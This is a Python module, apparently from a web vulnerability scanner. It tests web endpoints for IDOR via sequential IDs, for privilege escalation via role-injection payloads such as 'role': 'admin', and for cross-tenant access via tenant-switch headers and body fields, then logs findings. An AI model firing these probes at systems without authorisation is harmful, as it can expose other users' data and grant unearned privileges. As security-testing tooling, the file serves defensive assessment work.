"""Cross-User Business Logic — IDOR across business operations.

A real attacker doesn't just test their own data.
They test accessing OTHER users' data through business logic.

This module:
1. Tests IDOR on carts, orders, subscriptions, credits
2. Tests cross-tenant access
3. Tests privilege escalation through business operations
4. Tests session/cookie manipulation for access
"""

from __future__ import annotations

import asyncio
import json
import re
from dataclasses import dataclass
from typing import Any, Dict, List, Optional

from titan.core.models import Finding, Severity, AttackType


@dataclass
class CrossUserPayload:
    """A cross-user attack payload."""
    name: str
    technique: str
    payload: Dict[str, Any]
    severity: Severity
    confidence: float


class CrossUserTester:
    """Test cross-user business logic vulnerabilities."""

    # ── IDOR Techniques ────────────────────────────────────────────────

    IDOR_TECHNIQUES = [
        # Sequential ID enumeration
        ("sequential_id", {"id": "{test_id+1}", "user_id": "{test_id+1}"}),
        ("sequential_id_minus", {"id": "{test_id-1}", "user_id": "{test_id-1}"}),
        ("sequential_id_zero", {"id": 0, "user_id": 0}),

        # Parameter manipulation
        ("param_user_id", {"user_id": "other"}),
        ("param_account", {"account_id": "other"}),
        ("param_owner", {"owner_id": "other"}),
        ("param_customer", {"customer_id": "other"}),

        # UUID manipulation
        ("uuid_tenant", {"tenant_id": "other-tenant"}),
        ("uuid_workspace", {"workspace_id": "other-workspace"}),
        ("uuid_org", {"org_id": "other-org"}),
    ]

    # ── Privilege Escalation via Business Logic ────────────────────────

    PRIVILEGE_ESCALATION_PAYLOADS = [
        CrossUserPayload(
            name="admin_via_profile",
            technique="role_injection",
            payload={"role": "admin", "is_admin": True, "permissions": ["admin"]},
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        CrossUserPayload(
            name="superadmin_via_settings",
            technique="role_injection",
            payload={"settings": {"role": "superadmin", "admin": True}},
            severity=Severity.CRITICAL,
            confidence=0.85,
        ),
        CrossUserPayload(
            name="owner_via_workspace",
            technique="role_injection",
            payload={"workspace": {"role": "owner", "is_owner": True}},
            severity=Severity.CRITICAL,
            confidence=0.85,
        ),
        CrossUserPayload(
            name="service_account",
            technique="service_role",
            payload={"role": "service_role", "service": True, "internal": True},
            severity=Severity.CRITICAL,
            confidence=0.80,
        ),
    ]

    # ── Cross-Tenant Access ────────────────────────────────────────────

    CROSS_TENANT_PAYLOADS = [
        CrossUserPayload(
            name="tenant_switch_header",
            technique="header_manipulation",
            payload={"X-Tenant-ID": "other-tenant", "X-Workspace-ID": "other-workspace"},
            severity=Severity.CRITICAL,
            confidence=0.80,
        ),
        CrossUserPayload(
            name="tenant_switch_body",
            technique="body_injection",
            payload={"tenant_id": "other-tenant", "workspace_id": "other-workspace"},
            severity=Severity.CRITICAL,
            confidence=0.80,
        ),
        CrossUserPayload(
            name="org_switch",
            technique="body_injection",
            payload={"org_id": "other-org", "organization": "other"},
            severity=Severity.HIGH,
            confidence=0.75,
        ),
    ]

    def __init__(self, context: Any = None):
        self.context = context
        self._findings: List[Finding] = []

    async def test_idor(
        self,
        target_url: str,
        url: str,
        method: str,
        params: Dict[str, Any],
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[Finding]:
        """Test IDOR on business logic endpoints."""
        findings = []

        # Get baseline with current user
        baseline = await self._send_request(url, method, params, auth_headers)
        if baseline is None:
            return findings

        # Test each IDOR technique
        for technique_name, idor_params in self.IDOR_TECHNIQUES:
            try:
                test_params = dict(params)
                for key, value in idor_params.items():
                    if isinstance(value, str) and value.startswith("{") and value.endswith("}"):
                        # Try sequential IDs
                        ref = value.strip("{}")
                        if "+" in ref:
                            base_id = int(ref.split("+")[0])
                            test_params[key] = base_id + 1
                        elif "-" in ref:
                            base_id = int(ref.split("-")[0])
                            test_params[key] = max(0, base_id - 1)
                    else:
                        test_params[key] = value

                response = await self._send_request(url, method, test_params, auth_headers)
                if response is None:
                    continue

                # Check if we got data that belongs to another user
                if self._idor_detected(baseline, response):
                    finding = Finding(
                        target=target_url,
                        url=url,
                        method=method.upper(),
                        param=list(idor_params.keys())[0],
                        location="body",
                        payload=json.dumps(test_params),
                        attack_type=AttackType.BUSINESS_LOGIC,
                        severity=Severity.CRITICAL,
                        verified=True,
                        confidence=0.85,
                        status=response.get("status", 0),
                        body=response.get("body", "")[:2000],
                        diffs=[f"idor:{technique_name}"],
                        baseline_body=baseline.get("body", "")[:2000],
                        baseline_status=baseline.get("status", 0),
                        verification_body=response.get("body", "")[:2000],
                        verification_status=response.get("status", 0),
                        notes=f"IDOR: {technique_name} accessed cross-user data",
                    )
                    findings.append(finding)

            except Exception:
                continue

        self._findings.extend(findings)
        return findings

    async def test_privilege_escalation(
        self,
        target_url: str,
        url: str,
        method: str,
        params: Dict[str, Any],
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[Finding]:
        """Test privilege escalation through business operations."""
        findings = []

        baseline = await self._send_request(url, method, params, auth_headers)
        if baseline is None:
            return findings

        for payload in self.PRIVILEGE_ESCALATION_PAYLOADS:
            try:
                test_params = {**params, **payload.payload}

                response = await self._send_request(url, method, test_params, auth_headers)
                if response is None:
                    continue

                resp_body = response.get("body", "")
                status = response.get("status", 0)

                if status in (200, 201, 202):
                    # Check if escalation was accepted
                    escalation_indicators = ["admin", "superadmin", "superuser", "owner", "service"]
                    if any(kw in resp_body.lower() for kw in escalation_indicators):
                        if not any(kw in resp_body.lower() for kw in ["error", "invalid", "denied", "forbidden"]):
                            finding = Finding(
                                target=target_url,
                                url=url,
                                method=method.upper(),
                                param="role",
                                location="body",
                                payload=json.dumps(payload.payload),
                                attack_type=AttackType.BUSINESS_LOGIC,
                                severity=payload.severity,
                                verified=True,
                                confidence=payload.confidence,
                                status=status,
                                body=resp_body[:2000],
                                diffs=[f"privesc:{payload.name}"],
                                baseline_body=baseline.get("body", "")[:2000],
                                baseline_status=baseline.get("status", 0),
                                verification_body=resp_body[:2000],
                                verification_status=status,
                                notes=f"Privilege escalation: {payload.name} via {payload.technique}",
                            )
                            findings.append(finding)

            except Exception:
                continue

        self._findings.extend(findings)
        return findings

    async def test_cross_tenant(
        self,
        target_url: str,
        url: str,
        method: str,
        params: Dict[str, Any],
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[Finding]:
        """Test cross-tenant access."""
        findings = []

        baseline = await self._send_request(url, method, params, auth_headers)
        if baseline is None:
            return findings

        for payload in self.CROSS_TENANT_PAYLOADS:
            try:
                if payload.technique == "header_manipulation":
                    test_headers = {**(auth_headers or {}), **payload.payload}
                    response = await self._send_request(url, method, params, test_headers)
                else:
                    test_params = {**params, **payload.payload}
                    response = await self._send_request(url, method, test_params, auth_headers)

                if response is None:
                    continue

                resp_body = response.get("body", "")
                status = response.get("status", 0)

                if status in (200, 201, 202) and resp_body != baseline.get("body", ""):
                    # Check if cross-tenant data was returned
                    if len(resp_body) > len(baseline.get("body", "")) * 1.5:
                        finding = Finding(
                            target=target_url,
                            url=url,
                            method=method.upper(),
                            param="tenant_id",
                            location="header" if payload.technique == "header_manipulation" else "body",
                            payload=json.dumps(payload.payload),
                            attack_type=AttackType.BUSINESS_LOGIC,
                            severity=payload.severity,
                            verified=True,
                            confidence=payload.confidence,
                            status=status,
                            body=resp_body[:2000],
                            diffs=[f"cross_tenant:{payload.name}"],
                            baseline_body=baseline.get("body", "")[:2000],
                            baseline_status=baseline.get("status", 0),
                            verification_body=resp_body[:2000],
                            verification_status=status,
                            notes=f"Cross-tenant: {payload.name} accessed data from different tenant",
                        )
                        findings.append(finding)

            except Exception:
                continue

        self._findings.extend(findings)
        return findings

    # ── Helpers ────────────────────────────────────────────────────────

    async def _send_request(self, url, method, params, headers=None):
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                h = headers or {}
                if method.upper() == "GET":
                    async with session.get(url, params=params, headers=h, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
                elif method.upper() == "POST":
                    async with session.post(url, json=params, headers=h, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
                elif method.upper() == "PUT":
                    async with session.put(url, json=params, headers=h, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
                elif method.upper() == "PATCH":
                    async with session.patch(url, json=params, headers=h, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
        except Exception:
            return None

    def _idor_detected(self, baseline, response):
        """Check if IDOR was successful."""
        baseline_body = baseline.get("body", "")
        resp_body = response.get("body", "")
        status = response.get("status", 0)

        if status not in (200, 201, 202):
            return False

        # If response is different from baseline, we may have accessed different data
        if resp_body != baseline_body and len(resp_body) > 50:
            # Check it's not an error
            if not any(kw in resp_body.lower() for kw in ["error", "unauthorized", "forbidden", "denied"]):
                # Check for data indicators
                if any(kw in resp_body.lower() for kw in ["email", "name", "user", "id", "data", "items", "order"]):
                    return True

        return False

    def get_findings(self) -> List[Finding]:
        return self._findings
